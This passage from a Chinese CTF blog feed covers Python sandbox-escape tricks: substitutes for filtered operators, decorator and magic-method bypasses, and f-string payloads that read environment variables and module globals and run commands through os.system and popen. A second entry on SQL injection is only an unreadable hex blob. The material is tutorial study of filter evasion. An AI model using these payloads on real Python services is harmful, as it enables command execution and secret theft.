[i for i in range(10) if i == 5]` 可以替换为 `[[i][0]for(i)in(range(10))if(i)==5]

限制运算符&gt; &lt; ! - + 这几个比较简单就不说了。
== 可以用 in 来替换。
替换 or 的测试代码
for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:    ans = i[0]==i[1] or i[2]==i[3]    print(bool(eval(f&#x27;&#123;i[0]==i[1]&#125; | &#123;i[2]==i[3]&#125;&#x27;)) == ans)    print(bool(eval(f&#x27;- &#123;i[0]==i[1]&#125; - &#123;i[2]==i[3]&#125;&#x27;)) == ans)    print(bool(eval(f&#x27;&#123;i[0]==i[1]&#125; + &#123;i[2]==i[3]&#125;&#x27;)) == ans)

上面这几个表达式都可以替换掉 or
替换 and 的测试代码
for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:    ans = i[0]==i[1] and i[2]==i[3]    print(bool(eval(f&#x27;&#123;i[0]==i[1]&#125; &amp; &#123;i[2]==i[3]&#125;&#x27;)) == ans)    print(bool(eval(f&#x27;&#123;i[0]==i[1]&#125; * &#123;i[2]==i[3]&#125;&#x27;)) == ans)

上面这几个表达式都可以替换掉 and
过滤了 ()
利用装饰器 @
利用魔术方法，例如 enum.EnumMeta.__getitem__

f 字符串执行f 字符串算不上一个绕过，更像是一种新的攻击面，通常情况下用来获取敏感上下文信息,例如过去环境变量
&#123;whoami.__class__.__dict__&#125;&#123;whoami.__globals__[os].__dict__&#125;&#123;whoami.__globals__[os].environ&#125;&#123;whoami.__globals__[sys].path&#125;&#123;whoami.__globals__[sys].modules&#125;# Access an element through several links&#123;whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__&#125;

也可以直接 RCE
&gt;&gt;&gt; f&#x27;&#123;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#125;&#x27;kali&#x27;0&#x27;&gt;&gt;&gt; f&quot;&#123;__builtins__.__import__(&#x27;os&#x27;).__dict__[&#x27;popen&#x27;](&#x27;ls&#x27;).read()&#125;&quot;



























]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入之快速判定</title>
    <url>/2025/07/07/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%88%A4%E5%AE%9A/</url>
    <content><![CDATA[
  cd5699025e1016936ab721471ecd2fff10b375cd2a2a9023110763c65a9c8a1dc7561916cff8f7ca1368a56e66f1388127c614a097e515315e0d8dc6e68fefdbe3c0f2354d905d9fcfd4282bdc8a7a64abf21fd45aa43a358668ce4f6bedb3cd9951e3a17246309a2c4f54eac9408ac84c7ffa8ee28729d134220e9f17043faa5184469750c73781817e341d74cde8688190abb9323d9fb4ce1b3b46b6451f788e671fc00ac75df733dc98a18a411deb50350691dcc15969ca84d599345a2f30a9d2f73bdaf14360a4a586d3fe8890b7f113d745bf2d86a6121a922d2778ddf6888773937ceaa44b974be3584413b13069959e41d597e8b26d4960bf3865f7912b064a3cdaf5b1f3bdae3e9c9c152eea3d3a73c93ad3e7e03ac0682ba46899885b4fe0495897d7fab359c788408764142cc889613a2412251f15bd3cf3d84ebf16caf1142b191ccd03732bbbed120ad201170c5c27aee44e97a2ad09ccb48aa77295e16de3afd77bfb86138836daf2a6c0c63457d1bf4655ae16824e7e2e20de9215cff48358e0387385519e2010b5120dc85b8184a74569b46de0ec05a6a71f99e09ec0f063bb1aad8ae3f8f3019a9bf8ae0c08de4cd8a6b0bb2a6518ef4330aa2b82da9f7af0fabdcd740c187658e4247f7e409af4887bad49e8553edabc9f2f362f4d0b70f10cd82114ffa150af7f2d3799b4f7eb2b2321a71aa580b6e7ad1b57764b1551496fadd6bb86eb97472a41231386a5863e846fff7fbe4f053f4ae59b097700cd749596e3c5f0ec82a2f168a39a48b5faf8cc131af0f5047e145ebd55d381346b6b35461d3d079a88b0ee3958c378ae27f6e868009d2a0b060f1b023f4292ea1c9a4031f5f517bdc75b91d3a8959c4de1488831a493ab3cb0697d03e97c44aac3564a0b79843f59aad4b11d9ec6d9c72c71210ba4e2a7202c860492e37b6474bbd7c8f3889f010099725050748462002a44a97338b258733176cd9a4eeb8e507cc27f69327cafd5e2ed73794fa2b4516a9e619d07fba72d122148009d8a07dfbe7ad51e02f4a6e06d3c54f7b0b78821906a5af152f75a302f31ffd9c69fd062dffe53405fa19d013c48551ca1ab558d8d95e82277bb44bdc70ead45e196fb85c83bcc712b50d3bf7b235bb436c3c4bb5b39bef638f50b28944dbdcb37df5d278926d66149280339d45a2dbd3f80b1f94d96a04c1736bc689a98c180f8717c692f2b8b1d329cdec2618c336d31b26ed6567bcfb3f4c295060cc7790a1173d4523186917a653205cb23928733ed942f6d14e0614517d7988833bf22940915fa381c622ec7d8aaf6416062d6eed2cbbf3a599df307606e8fbc3b5c1b5c2b26e014b11a6f82a7a25174fcf13983f34048bb82510bd5b2b6c34c08163ce88a071b36517c59db2495f70e1ebb18f395294e2099e82a4c5354ca84a7d81ff7c17cbb4c8e9775d7ca5c3311b53bcf5d337bbe37002942d5fe5b87bc4c4f6de60a5512d3e4c06c00d3f7d7b9d5e4a4dd460105af98c54cd3fc5146a6ca6f0943624a83d884e8b1fe38de4f85e8633ba738a5e68657ddd7aad61c81fbaaed94af9ea2fbf3ce5f865e931861e69d030185336b8920b46651eb4572f76e6239c497c1b3aa0f84dd4f22300362e777ebd1d24b79e1fd3ba4243003126e903c3b7281b7890923b4a09d4a1a3422dab3a28349d6605a3ecc9977b51d5c95b5681a269424e9f9620b91aca34cbe8790c7f9a42b7d09e242bd522f37ac04e2a32ed9eeec5718096c174dc942aed181f3a5357081b50fc518e9e36a292d9182ed845df26f370903a1a5b8ded2eb3eb5772521dd16aa38ca3bc098a2bd5ebf7051235c8c866b34ec771e61f6fc387778d54f8a79f02af8592f3ac8d51f2b45d600b9f0be198fd254d347f2e93ef5863cb70ad838173e3adec42b99334631c2e5cfef75623aa9b5d26b7351baed63923f2566cf409702a35aff86dfc5266772d20ee917194605a98cc66a8319282d092e80c79faf93e75a6103fc11ca91cd748d95cea490ddda0f19eef16aa52352d3fdd96545e2e72ca6bc5d8de867e1192a37702b8e0d39ba64b83391ce3972487b7b69556a440efb602d96babac7504a691156c9dbbe0d09704d130116a235d41652842a13c7d74643c04fdedfd032dc872eff7c9d873bdb568e4fad07f26a5ee7af5bdbb25cf0bae68732f1d5afbeb4c2b06c48330a4272876d24dbcfd2d65b33021f611e705ead43247afb2f5aa87bd5c42071ceba4807ea4fd5b8e203be629ec2f2f9d6e551d5c5f29340ca4666765121549a25f6f72adf2d438381b4ba3fab5c30d67b3726942b9d572de9c4174adeccde891fb065b8dcfcb168aa2127b9bda6ee8129ddc185774b4c4c86e2b5a47f1cb0fa63dfd836e02374faa081ab76cb93b183d63410c8500fbfd9f1726f588eed84df71a6d5eb6f8ad42cc39a0a5f9a4f183baaffdf3bec8bff27d9bba6bebc53bef03b940aa081cad23b6cf01b96b6c7f28a385a2ee800ae9eedf753a7357e3952158531544b18fc9c7e4ccb3bec481c04907b704950157f576ae933a77e27cb4a045309e84e9a42f899c7d439c0f94f5e233b260dd17db1085ae0081503cdb663e44b8ac786043b21cdc4a4c06f4b9d4ea8dbde0e934793f3bbcfbc9bac8323962345d8e66ff049b5a07e2fb538426654d99635791c721766fbb632dcd0da38ae5f7b7218d1cb234c6ed490e89b15bffd52742e1c95574a346137572a9d40f4086b6dc8eecaa5f69bc7dd5ea0c0a7dad6863068951210a64d318a25c8d00cc64c3705e19a9e6e0324ab237e0cdb382ade23205aa0e0685596592a84b364f821b165e4fa60b088717c4c4390f9c76e329e0701ff00f37fe4290dedc5bdb808db1f9b282261a7d51f0be7a521fdcf3e663eaff2de0c87948453b9dbc49010c96a91183fca976d46c5fd84178096b69069dad8b344f44abc4b763d60785a73d7f2942bb1ae744b498a06f8699768e61b0d67b8a74694720701d9d768122b9b03f7265ca840787d9f51feefd91ee46b3df1c19dffab23b1069a1724c35b8a0da22e0b8c08457e7c682053032581fa001edf3c986f6092000d7477f797a5c3a4f1e174bcf0499552d98ec757467dee872e2d915cd7207697afa227e6d2dabf819fb381f23ceee069a358707881486dc13e12dcf9d53d73d6d32ef75d65b655f4e7664c2075fc07d826777f764e7332f53f780e6efa17204c88f8d08cbb56859fb677781c34c558c7c926db3be2188bd4203d2572e03b0ea3f621528f26dec78ac8f0420007e9d97e557b12c1c6cc19c8cf10f292ace2d7d1a78b596566afe001e6811b8bd8c8d54e7b76e4b798fc8b832e5cffd6a6bce90069813df547b76454db49bbed6e7fcafe54717b9f78b47a0e3754759e09a2e985649a5d491cc6f3fa883d74aed81434d383a008dede8381ce1ba99c31330ea310f220b8b3b62e3c3b9c6f7cf1d075333904fa7c0f2d6dd0b09861c9b10d5a905d3d72b9c45f8698bc7bc6019bfecbc0d1440f3865649665dcb7c9d9fe9ea74576efa0f1bdc43ee1ee8432c38a6a65142a81022fdf146ea64edb1810ab3b7e493e324acb5924deee9682082700e3945beb145019fc2b18beb8a005e7467c86fb86d086835a2652210b0429f2609c2c9578e681e6f6c3cd5dbf233179c33bfcd2d57870ef0a6d0af691b42c8778606d4c6fe4255548bf4816007fa73bc882a0f195ceed0d5ff7d46e179b5198eeac0625aa2c1b82ba277145d30f46f061148c870478a7c856e851c12c3c49a214c3c6940f542561dce38aae73a649ee6ac32be9a095c1d7b5cee29550ddd3e0cc4fd15779a075d3480663e5842ed18d2d255bd3d31e80b2e93fdf1edd9b4f20f892e054a53cb4060631297d60d1683b3bf7b33b2e1ab55504c1efca6a13f116da126372f334d96131ab0dab7c8d6098177f03e557fbe7f5fefc9e0fb9525f0290d0334b3f806cc5e18f75ff78a31ad3f0b86eed4ded7d807a752e950af5a505614673e5418399dc80b5fa694d4e59eef05dcc742a25a627e17f721b7f5c0494009aaa71306ee7af73b1133ad84f708b355ae52a63986cfadd16e213d911027289b48c0f711ee14e6540f614fa70b90431e966546f0e3bf171732ede7b47bad6db23e2c89557d7e5915b22b29b6ed9c4e2a8d172bb9b5d911e78dbe75d8079f3db90c3b7d31f0877393570274d837dbd216720b4d0dd41421361125c6002ea29db546fa7b71e39aa6052c3995688a0be59a0ebfea9a798d64af9df8999338acb16d92b09f8744a771444cd62705aa91c74cb36a875a9ceb1a444c1a8565b00024fd7885b6496eb892d9a689896568ed222b2968ec825949432acc3cd804fc338a5d0638d9add389375403890fef1b9ec84b1610c1468c24da9b0cf102e5cbd1ae5e5612cee8ffc9cb3d62de62b482d7c6814d6a9f1d0ec0187a2ec18ffaddd56a006b93c8ba4b06fb78f02fd040a6e626f70e8e452866b8eda55a9f7e31e9cd5637de3dccb63e0eeca79bbae000d2414798539fe81f9e72419a3c18faebd426e76c6f423eeb62920947b0a491bf42e5b057a19709be08222f6e476b992d03960ee43131944e601a4bb2e99ed0c703e9a8259ac7f03e4cb0893ef116ee67dff50b4df62e6bc171161eebfe370c146f2e73ae3f8f1a1e54c30aa5c7981cb7e7c1a67cac95ca1210c3eead529e74737e9aa0d6cd2e7ed05854cd8004e6f4e83228dbadc93502a570cd02157a3f4c0c29a9bf1e0525bd4e5d396d873c3cedf0297808b587b6bdecba3311aaa0bbcf260d59504f88b70608eebc4d39a20ef76475d824ac45bf7fc31d4a667177bfa4cdc15a7f9bc0d94fa6630be39d817d2da74144579902110f30118602f598bddbdfe7da6032a30393034a05250c990e99c41931ef2547121f7a5bb240aa468da175503c10d1f18131cdf7c36d71ddb9d2145f9361dae30da2e222c9a127d62b4d908aadc4bf30642bdb4cc842751357cebbadbfdf9a6cea3eb1fc8301bd4b06cd58fb379797308ed1b82d0c510e5b5132a113abe0bf4a8361bb7feaa7f85f0093adea6c2c15f6d3d23652625891d46041707dd5d41cadf08055a624daffc6ca719b97977cc8aebbf2ba02bc8df9a95aa0286f0e128deee1941c4f54aaa9652716b6e3c5f4adb6e05606c5f8cb54df17dc2cd0fc4644d092e303fde0168a97208cd14ac79f72b96de7405f184ae5b0cde0375ecd90bcba7b1883a32ceae097a8616c4ef3936343558b4449d3fd72dc2751d8cfd0f92c1ec491e638926159ad189bf139461e22f792e68f2ad8dc6337d28a7a1e82e1f2abb7f37bcc01066ef09f0d74c47dca5e2342db006c5fc6d60f38b02167a50819b578786cb20ea309010597a7fdb04d58f98b58529a5a5c965dae18c0a25962d36357dcb4f35ce73444d6beb51e0edd0b78d8c461dde03a619c517c58aa3506cadc11e455122ec89e3836122a094266d924cdaa4f11c9928ac5a2b089d0e7b4a7d0fe9490e777312b1dfc1e5f5a2474f8b07995b850da2123b8c6591d9db76991ceefd4b34313f4a3f1d0eac2b520a5b43983ae72cb7cc859974aba8ba4398620bc8755be797053933046615bbbd8ef50e20d43dc6b5edbb9bd2b4ffd314bae69d14fc4c2adb8fc6251944b666d0fda4eaa325be58034e1c462cedd01ba7eb1c3eee98c1ec0ea565d2f25a9430b8221e7281ea87f793d273d140104276b8152540214ea0f0809f49e30417b562369f4d5b437093f65d4b298a17a9f37870b9dc6976af4b506868b962cef7c38e5d3b766bf1d2fb6a43d5426edd5b256afb9c1d59dd67671a343448c88fb4d20f7b1d40a0338f04437fae38bd5bf4ca421280dfd6c99b3430e1539a7e741ca859ddf7b9813a7e6b68b6650996c03ee28f2f8dd5c3872597ce6fa6fe10e1b25b8a39b68d2738e207ee508a3dc758f810fb1c1136fa9d49d0fc3f2333e53b1aa3925a8aba352fd2711f3dcfe1e53552c5c18a292e1e9f388047942af20a14493b42724d9dffd924be97ad20a285c828856a22aa53300816be30a25940ffaeb80c8d8c0e11b6519a0911917461ae425fc01cf4e8f7cf88b84438c1f5302ef88ee97bb4f2dcb45e31eb7f0332d1510ea0535af63ea6e063b676f4132808349e5e06904ab6821928f420bd218894e5762669a5dd6f01c45e059f757207d31ddee475aaabe90f1b375e3723e107d80e309fd0734e30b9f79d15c47e337da288227fd1fe0834ab98da91a2b695f2d1fe69fcda402a01a2ae6919677df00865843df6fd0e8e808d6f412d1cd913d68450b3076aec85dfc2e8e48e10ebf5cc751f79c25003fd6442bbaa4b508c8a52a505dd6ac0715df344d437592d898f37ef4ccc6ed55cc6a4eb72bb1f25b160c9795eb6ddaa16bb0a2b72ea2581c7f2633ae6dab671d1a248283596b72cad053a0163430eed3f428d1fc8a048fcfc6b52862e5d9605e2c549df3e9883ba2cd591db72fa1715b5d5ac5e2df67ffecce9ab8fcfb68b4ed769abbaefd4294c6b90d70ca6d23537b732bf5b4b2fb7d59f4a335e60124c9fd77a29d29cf509d958f8e6878dccbe955610111eda4044fd760f91372434660da495cbe41e636cfba5d802d9982ee0484e4183f68bb3b9f469cba4a21443c5edf79ffbbd2be43860d4294d1e91f5398f56fd0a7e82cadfd85ca779ca2b1ac6d79025b99f91c1de79697a2502d0194202446b6d33c16e1734c0c7de787f3c69cbb887a794e4e3476da11a311500c8f57cf042a798114cf1910feb489831b0356318499e15c2514a75a12809edfb6434ecd717db827a74eb03cc5bdfda115855bc643f650a55da64cb7538846324d298bb26c401398e9eadff4ed9b9b973d590bd63283388aad05949eae897123ac3ab6f40bbb7e6dba6a96ecb1b013fc733a0eae860a25627ba56472cd7271738072d69937e406eabdfa4cdc75715aa974b7d9619fd7dae0d85189a9c3a60ab7c56e61cd6443c9c4b193d32593f6f417c65789b9f6a116d1f3328e95d784bcac23b3f93152aaca4990afc752681a57ff988905e401bae263f1563aee3c5cd0cd75e5363701aa0a9acc3186526e53f69b4cc822b37c2ce9922f8aa669e5c372d01995a09e3c339e495af7cf47f57638dd9fefd9313c03cb35fe687f678dc3819f2151f39acb28b8c9a12dd7a8b9f1554da71c06276d1582bc95e9f6adfd029bc56f8585a3041329aee4f7f06cce803910f3d83082726e1c24934442972554328f28c349b60e8eaa6603521b36e29957a7c084f2491eef3275656aaffa59af5d1e742316b414856a9bc175ab5135cf4d4daa7b1b67e25b8ee1bebb30f0d687716024044e2012964e00cb6d40057a0e7f2b821001d1e23ea95052fd354baee9ddafbbe99c5897837186821a515527d92b5951ab72c5723aebf0554c6528cf28c4980edd7dd456285de529f8799048d9fdd0dff32395d0fba3088f1c3ec89589b3ec6437ec9a9192b721b1e5273aeba78bb3dc75919a21394d8dc7047a2143346f3df9a407cfce9d2db1fd2bd1565184a6baa4299bf0db52ca645b6e9405d096d7101b6bb4ffed817e9d48661d7bd8173592dfbb9fea228945926adb8a3e387fd6876a310f3c25e48aebfd43779ae86a43c8b789c7204d90bf49ee7cfc2f0ff046e32b15405c31d75ee71ea364cd3c864e1718557434c25c732bfbd442d2f3d1df149cc41828c78a077952d67876241848c8f93999139826371cefd572282bd1080d478fe55a711d43b08f8db31b180267818f65f117382e0e5ff7785b4add8431b6d77ada956921ca5ed9df1faeec5e63454f02507f7b657093dd599cd328ca5f423b2b774212e7db4ccf971e69517a77147c5ccadba7c623eb35b72b066f0cb55f911978eae7f774de86541072e3b2fc4cc72380265df3c64787cd009685881d9121f27333ee52b1ae215a07bb7dc74ad43d048c37356ce785d77ccd699cad17d99386ac0222328457ed9b934ae3a8e9ef3cefdb5601d3f6d5f7ae9ffdd2a58e75b45a14c6f54bdaa9629aa4c73319abf6ecdbda1376f1360067868bfd90cdd5912e429c4469c27349c1e7894d18d741cfe7a6bccaf1709b9e97fabafacd1fc2f0aff633da2fe2a302f05d6492041abab2e3d7ae0ed30bbecdc37fa6273332254a251f866cd228a890d13cd74ba67e1c051bff5d52a44e42e57552003a9cbaf5e336a5931b172992846abfdb3101380b8ca1179d129b18515f958a354a7acca489469088154365c4aeae5d7364897369686401a3ca1af4457ae200731867e1c4f01491b7a0d001d732ee4b4dfce1530724d04dca80b8452daca6d9b37bf2843d32c3ba3c9adbfa0725dbcde139983a424337a12eda882a1ffa5852f1c08a8b696291f121d2ec4403f671ef6e6f220d6834ee3b8801a5e4cd88653600c9d03043ad150241aa59642d82326a39cb0b78f1af8fe3bf51adbc560096b8a8cbca64affafc9a5f5ad605106dd1247d2e085148b0434764668946cbe6133142c994675ed89f9da3066a6868f8c7a0a7b4fe612e78608669475483f00e0c038fbc96607717e1d7c0eae894e713e9e6496cc1e0482d8f1bab8d23ed6befbb25657d5ce52f1934242cc985f6b8285eb7cb72bdb713df16fc9291d816bf38a4009e49a36a2ecee6d8d1ed3ae8877e20670125c1ca7b093aac90a44f5c59bd45a8d81f53f8395f15edd6fbb420839fbadb112ca9ab6752b1bac1672ed620db2ae0e8182b4a4d40fe52032155acd3fcfa46ed4fc625189de8da285a69a3ff6aa2916a440b70e32140ac5e01615161bf7e34a7f6e79c070313eb1a4ba23d2555f6d14cc90cc27ce8a36adc9f3463964799858bf15302f17b779c536f4a77321d133412a08a44cea61631a55eb02e61eb66129b3f710b4a42d3c7c10c6f2e144870e5fb8dac35716786f43bb7a5de767165d9ebfb1a522ddf546d67a708fb63ad2915de80f9856ded28a078cc51b17856d25aae1f0f5f6ddc5c566c83e0ed561dbe65f4b03366c31536bbac9f7f9b016fbecf066235fc059330b052dc9d0071a2288e98c3086d7e01a9900dd2802b8b31407dba87e9c09e418b947a83b2047a4942040bba6d9a9fa3b4f36fa4929b3af5976afe80f7336ff4724453d3f9c07463a64929099955826ca59735e22ead1486a7572d161802c82d2935c9ef26a27d068469794b1d011802545451ea2c3ca5b0e34dc8b21cfa26e4d03d0b82716f6ed39d0bf8516ee7b99600576b6a69addb3ae3cd4a52841c4a304ad0b700a1d4e3fa656ad54da139993ce27b1be6d50489ee59d57df6f59393ad67d0ca2eae33872dab49d10b4a315fe3bec23e3b2f53610001ac6201cd2903609e79610a020989d917d20d84254fba932ea4679b0711cdfb4f7e00efcba55d60dfb240f8b4052f0c539dcc2d1be77f4ea463d37698fa04e5a5159aa19902f3465e0f2dde1be4f9f9ec3f456cb94a5f408f24f2d2d9a95f769706f3803057ba97f9044d7e26fd5e59da3c885976865bc7c1fd3583c2b876f12b43b70d043faccf37e27cdb0fb81dd480660056dfe14ab77753cb6081f9d5802e42fa3b424862f58474197fe67abf2c50cf1cc718e1acdbad0dbe9eecb3bbb973d1a8c2b6619365fbee61953d311908bbf5fc4ee2f523d3df2d626fd36eab5f50459f5d02df97ec25411730594d96967e4bda2c83fc56562dbf4b7efaf8d2571cc886ffe618a7ab335ef471a11313ad16362e8ac9fef3a2b3ea4840b235fc71d161b3c5f01e5b894c7570a987cc1fd9c09b89dfd232a98b603179cb6123855501e7d473ad06d216d641456367a138ac37432a7f7fe80ebd9b074971b869171f8d8eda6b9ff7887559348128ba0f9c168cd36fa0a3485d90ee8465347fee7b91a0851f9ae39d2fe4833b819d44cf4d8b959db7b7746c879fae2c001fe4051adf624c38e0fa840d32534ad162c1615772fb6119c3ec79c0b4ac366d102f2b8076aecbe2181f25d4727d09fed1ccaf7539543e98003ad9f284800416bc6e8e063dfa7840f6007368677a55f1ba7144ca4ab56567d46814cd2cba1d52fdd5bbb29d3bd97a0a237d1b2cfa30fa36a230d7eb99a188bf60999928d1d52b609552c711c56d03e8ee3890a7e2cc8517172f6c8752c33fdad4048ee0b4ff0b69b3772ac8dcb1b568dbb27fe891dfec88b8c8c01e479495c8bb27cc61b13349568b67e5bc1d057e5c6eb7125baead6720b3d9ebc0d385ab4de03775ccd36ec9219943237cd2930a1b10883fd7dc67074968abe9e150571fef53dd2dbc12ed18019fdd4b79f27bef8dd9c8c3a1aa2c3a6989ef4ac88203559a0ef5feffbf84e098ff7dcd8a7f875c6e18ee3a639dc16b4e34970c928006cb169b52ead09570ce74ee08c32e508385ed42a3ae76d557a3f93d893ded934e035f550f09db03ee29e7abbd428ab6baf004018dece940c4d4f1e873b8de631993912021b9c5d17c6e27aab36b5bb7a4cf870f19836b3286ee3843b57cea13927eff95b2534ff68cc76b1f5e22af6dae949c460c3b4bdfb1d2fc885ffe4bfe2145453c9650f01a44039b2f21821973c8d1f1d1e54cef34aa482016615522b66c124e6da41e865da1ee26b6dcb96d3ae20d90e219117374f41029f2e74ae92818437f50d2c7d79db39d301c694f80a2378535f2c3b97c614af8779c17bec91321fb0d6a7035961592447eec2dcbba9d38860373a28ef48be1f1f6f8466c782cbd5913274d2ad5d24e18c3f47752812a48e1c3e2ad6d5210cc11169099e43ebde4990e533923ce234d563bdb5ac66daab068d1722f913cac867daf57e4e2f9a4b4742c73b7cd12fe269fc58a0fdbc2c9c3dee765956e7234e6aabea7511908f2eaddafc2aad0a97b207f26ebf9245056b967479dd810a024ceaf210c93632e93b6b72ce1eaebe0c8cc58693f92ed292d05b7acb6afbc1c0434498dc347f9e6edb629eb398f695b55a140f664f18aa19f1bcc93af2173e04f32db6b937e796f0cb2937be04cb13d6d552110f8f6cfe0672b93aa936d41fb63f1547bbbf9704b994954014275c9cdc8fe746143490b3d8a80ac8176c856083f8d44e8f9261657d53bc78277634c56083c5f8b600213dfacbb4150d525bd20452be3915601b77585fc909c74fd2cb4ba9693dc95f0b93e9113f253eb0ec06b9e7c95cf361d5347908b1703272f12870357ac9faec8ff924b03d2fb6f4dd4fba93b6d754d2eb85707b48040f0cbede6d12b1a184aeed8b443e5d8bb01d584e348bbd2340f9c1fb13496ccf6903c778ee3a7c5aa956b1af8819461389970ed17b7dad154976a0c137bdf351febc2e7b1cd7c02772fd28471267a7fe12cdcc04573f946006b4a880ed100707b877cc5100704db793148ec87fe2d634153b2d2a7a108fb664988658e212100dc7d237eb3aa119efb3dc41a9d83efa4117541c6c3ef54c25f4e342d5ec1164092c9931f16412575726a27d5f8fe3c8f33001ef614a0acd3d2a528fd1b5d18e02a5a5fb56ceed6fa66b4804c8381379e88462a0de6f52e1749d84cfc115da523640e04cb5472685d528863d1c037479d4e19dfeee53f77f65925d636713672b7224c60095b74d1459f5b737e3498a35dd4b64cfe459d89f7e39492cc3562abd46c057ca87aa579f654b6775d393621ee9da9a0938d576f97512d5803f20dc72755c45165d4ccc87526b89e00ef236c29d1b42cc28aeb3c8e0f35dd697cde373c5cb5f6aa70b716db7036deac3542ea853386ebf84d132052215cbd17d15200f6c765a84459b03fc0564f25a9aafa641491ff55d16b056e4e44898903ac0727e8e2cf666e6dcf92aedc7e6a48adcac2b6dfc316dfaea82104d1958af776b113c467f39dc4af0c1e7742a09543c4ad3652a3297b234d54f6bc31495749d848864a223c9de8009fc98b4d85de7bf0e7884cc64a474569260eee4ba974ebde54568673c53467ba9ff44d6bac78545e73a2e3de1dc60fbf4dd6df7cd2466acc66c0081b5b68f14e90a6c2ec0102e0142c4a80f657e6059bf9f6ca407e3f1e81598030b16dcb339717382da98f0bb450f3e4ff1eda277d3035ed3ff837132a6050b6baf422b44996441580ea405c67a78048487f71e7121483f404c1d7fb637e81688c1c82c7ae317b0f1db57bf75fcaaecd40de004d413717fa5b8dfa3d050ec1b43486687fe49c14338587d8301aa771bf8ef59e2947e7ba3caf223edb446527abf3fc1019c973baea9bb33492249f81231eb1ff9b0b311f0d6e88d9fc30abd7ec497ce38032b75e4fd330f4a3cc80cd363667bd0748a31296da8b0629adfc19d7a39257e0662b511cb689d7b53604f31038a05dbf81256d5b5eae17428803f8a876bfbe6e814e5293daf1e1fce545d817906b134f733e458e2bbb4b62807209097f5bfa0a09b0a3a9801a0bbce02459d986520c41a540d549b05869e699a42e0f972e1f112563e017927027f17302549cf16d59296a5cba300c60ef09d696ca6e925567ff0b16e1b8efcba224ab6aed06d7abf3eff38d36fe8ff7c10dee90ab92d5083cc2e84e30cf50ea0daa857a23b0828cea2d43e04180fc563a991a22ec7c1d4e84186d45730ec528bc7624c973578a06fa92dc26fd4bfa108282fb6e4b47490448c3d592ab8dd5e514af96178b13859bfb7c3078ff50f934209e34b4b2aacd64c664ff458c95722568bcae82b3fcff06007a74d9136566a8ea17ef1c7e21796c15f03a89776e882484f576cedfe4a4f3bb45e97066adbb476b3c13615cafe4a952269a5ecdd7d468e4b1271d201d1337e0ca12b056e795d6645c1f692d247b662944842ced725b037cf4d7847e2102c9b5e1076a647d468e0a9b765b66afe10dbae938cb57a91b10d62ea6c6e9a5fedc62470ebd2377af0ed29446a7a385eb3fd95c81772689315e4e5b7b266d58cea217f560e08352d6294d704310558111b2d1d765e9518b5e5c93f5560850435bd7e9840795687c4e82bdd3b7d439e4e6f90b210abd585a9a4aed75e401f6368c5c7101d80b868beefd974f5b124da7a0bff47b68e812d0d10c7b59dc88f7dc38a4920dc5dc87af1bf4bd8b293717ecd2158df4626551bb5f85b295ba67b7ef63ad3c3ff0c01a736c3673358844c259b7a2a802262bfdac682c0cf872b9fc2b1910ac69be8d00cb15c8ce681c7b8baafca7690f220cf8938b4f92d7280bdfa247ddb5fff43eb7afc315a4c08fab8e5883f8fba89b961c97023dc43ff6d6c0d211578d0178659c7febe9093fe061372da230c709037a832bd5ce0444bc956e0a631e171d09543408fea71d1ea6600393b5f6bdc4bd864b579fbd91b55055754c35e033621a32223e38f7e719daa976d14188b1d5058f73fcfe8541755d97f29a0d3627ca470d0f39ba438b6bf266bbfbee2f1ac4c3a0394a82d02656b012b88818e5479641f9a30ef88ee4fa2a246c833e89e449468b7b554d3d815d491c2f8ad735fa0b75dc9f5f7a0c1c6f6a6ac82860032c12a088aa5b11e8dda85ba5e3124893435064625cdbe2b0917597bf4c3129222dded1c68bd1b757a0353887fbc9ae892109108fa440b8deb918b83a2dc298e57d45f120e653caa31b8540862438d8ab294f03a0e09217fcac3bf78cbed55d56de93d487c8af43c90f708b6435c413b8c0f5f432968e60e30b0999add432b4b762c0347999d9353c3f56306ca1935c8c581062130d6f63cd3bf0bef95e6f77bcc85df1df89e74b76abb9c420aab17f3af7ad6f5a898fa350a7af2e69d87ff8154a3494f0136aeb9c3df3b6c8449f2e16cb3c8c781cdc69a79ece0ab3fe276f79517ab0ef57d72ae32b9f5ad055dff67d703a31d8d5df306fbd6b79f2c7ee0cb8491935f6758d9b2a725a620487e8183a474da2b20e99b94a260c1b4b95fa973b5ea3b5575c550e9975235f3e888aace8b9438fd9e2f28ccf60540e3be274dbbda1013c1c94a7493ec86c518392ef02f5b642d8d796622994292f3b1ad0ec6d7c3207c41d20c0e7f45113f50f45da352e235dee41191ed301f9bc4320f15caded94f7171adbf5110428826ca59aa8104f5eee22f2975543f2667d1f2a984a91fcedb8029ea7d65a6447820bf0bd5f3a12be22072511a616e9af3a1b766991e3d00c6b53b42f5343b44f2dab638b7f7bf6778fdba00eefee7f7482c0dd0d3d7b4e2e9d6d6735f1acd970ed6f8e988d6ccbee22200ab8a17343efb03c4e23789f68f9cda26fdd25dbd9554a8b90b2f3fe36205660640591a1e90cce8fec58e39aae2c3ab1435d1283d0d1d1a62253d1e779de5a491f8da50c26e8b0be09b9ab15eee81f00e32e7d7922de260107059c19cccd05d2aa999f0b42697c6627a07e3d0a95f7edf67c205f8831f06b5b133efc8f311e19e774e3feb316b141c05c49b87b076ecd8816d2e45c91a70b06e4f1b99fc0acd59b7372274cdb8674fb4a6f16675635d96273ee3b944f24d4982973a16168fcd7d2016a592109e214a7b802e550860751612abfc216aacc822ef4a799acdae71ae5478558c0d30db66cacd8ce53aa080d7df74fc78b7aecf036df7d96d1cb91f3526a2b9cb6cc08784b98630245fa33f3f71817de6f49bef331232464cf4b7b9e9d278d2d624f38fde57b572be30cc16a2e77f41d090bcad933ec0ff993706da03b3fd0e6b5aa27ff992ca0ef3d2d8e16a0a55cf5d17f23d9253dc4fbd1e62783afb27a609d2fbf4f5efe91300825713c39bd0ec630be35021b38d152f86d57af8dae55a3e6efcb8974d8e310a266125ce7ccf013697e6d8b3887a922910babc6606cc35d343b2beead60edb9b252899d148cb3d7078515cae8799bcf9d0de8650bef46569b04afc40c4e07aed6210550efcc9854ef100d9fb7ea92a07149a4668587a4c42f37d928ba90f25cbc18fcebc63e0c5f45deb07defe433965ed85df4a792a7621e24c4bb1f9b42d4be3fdf5e565c7af0ac6f